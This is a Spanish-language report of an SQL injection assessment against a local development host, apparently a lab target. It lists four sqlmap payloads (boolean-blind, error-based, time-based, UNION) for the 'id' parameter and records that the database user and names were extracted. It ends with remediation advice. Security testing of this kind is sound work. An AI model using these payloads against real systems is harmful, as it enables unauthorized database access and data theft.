# Informe de Análisis SQLi - web.dev.local:8083

Fecha: 2026-04-27 10:59:16 (UTC)

## Resumen Ejecutivo
Se analizó la aplicación en http://web.dev.local:8083 buscando vulnerabilidades de SQL Injection. Se detectó una inyección SQL en el parámetro GET "id" y se logró extraer información de la base de datos (usuario actual y nombres de bases de datos).

## Vectores Analizados
- GET parameter: id (found in homepage form <form action="#" method="GET"> with input name="id")

## Hallazgos
- Vulnerabilidad: SQL Injection (MySQL)
- Parámetro vulnerable: id (GET)
- Payloads usados por sqlmap (ejemplos):
  - Boolean-based blind: id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -&Submit=Submit
  - Error-based: id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP&Submit=Submit
  - Time-based: id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE&Submit=Submit
  - UNION-based: id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d565148786279414c49575057486e62576c7a784d474c536d514662424c6c7042556d474b,0x717a716a71)-- -&Submit=Submit

## Evidencia de Explotación
Se ejecutó sqlmap con las siguientes opciones destacadas: --batch, --dbs, --current-user
Salida relevante extraída por sqlmap:
- current user: 'root@%'
- available databases [5]: information_schema, mysql, performance_schema, sqli_demo, sys

Los logs completos están guardados por sqlmap en /home/kali_rdp/.local/share/sqlmap/output/web.dev.local

## Conclusión
- VULN_FOUND: true
- VULN_EXPLOITED: true (se extrajo el usuario actual y los nombres de las bases de datos)

Recomendaciones: Validar y sanear entradas del parámetro "id"; usar consultas preparadas (prepared statements) y limitar privilegios del usuario de la base de datos.

-- Fin del informe
